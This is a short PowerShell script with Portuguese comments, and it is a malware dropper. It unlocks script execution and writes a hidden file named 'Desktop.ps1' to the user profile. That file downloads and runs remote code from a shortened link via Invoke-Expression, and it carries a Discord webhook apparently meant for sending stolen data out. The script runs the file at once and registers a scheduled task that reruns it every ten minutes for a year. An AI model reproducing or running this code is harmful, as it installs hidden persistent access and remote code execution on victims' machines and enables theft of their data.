# Permitir executar powershell
Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force

# Define o conteúdo do arquivo PowerShell
$dc = 'https://discord.com/api/webhooks/1185172334592655371/r9YAVpnfPK_W5z5D4F0WmkdFO6j7Vo7kSofgED4Ntol0ht1z_ZSMTZkJD7KcdoP30J1V'
$scriptContent = @"
Start-Sleep -Milliseconds 500
`$dc = '$dc'
Invoke-Expression (Invoke-WebRequest -Uri "http://cutt.ly/ClankPT" -UseBasicParsing).Content
"@

# Obter o diretório do perfil do usuário logado
$userProfileDir = $env:USERPROFILE

# Caminho completo do arquivo, incluindo o nome e a extensão
$filePath = Join-Path -Path $userProfileDir -ChildPath "Desktop.ps1"

# Cria o arquivo com o conteúdo especificado e define o atributo Hidden
$scriptContent | Out-File -FilePath $filePath -Encoding utf8
Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# Executa o script imediatamente
& $filePath

# Cria um novo agendamento para executar o script PowerShell a cada 10 minutos
$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-File `"$filePath`""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(10) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days 365)

# Registra a tarefa agendada
Register-ScheduledTask -TaskName "ExecutarScriptPowerShell" -Action $action -Trigger $trigger -Description "Agendamento para executar o script PowerShell a cada 10 minutos"
